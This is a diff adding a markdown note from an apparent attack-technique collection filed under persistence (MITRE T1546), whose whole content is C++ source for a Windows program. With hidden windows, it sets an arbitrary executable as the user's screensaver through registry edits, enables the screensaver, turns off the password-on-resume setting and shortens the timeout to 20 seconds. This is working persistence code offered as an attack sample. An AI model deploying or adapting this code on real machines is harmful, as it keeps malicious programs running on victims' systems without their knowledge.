@@ -1,0 +1,89 @@
+---
+title: "002.Screensaver"
+folder: "05. Persistence/T1546 Event Triggered Execution"
+---
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+void Exec() {
+
+    const char* command = "reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v \"SCRNSAVE.exe\" /t REG_SZ /d \"C:\\Users\\User\\Desktop\\KimJestem.exe\" /f";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+void Active() {
+
+    const char* command = "reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v \"ScreenSaveActive \"  /t REG_SZ /d 1 /f";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+void Secure() {
+
+    const char* command = "reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v \"ScreenSaverIsSecure\"  /t REG_SZ /d 0 /f";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+void Timeout() {
+
+    const char* command = "reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v \"ScreenSaveTimeout\"  /t REG_SZ /d 20 /f";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    Exec();
+    Active();
+    Secure();
+    Timeout();
+
+    return 0;
+}
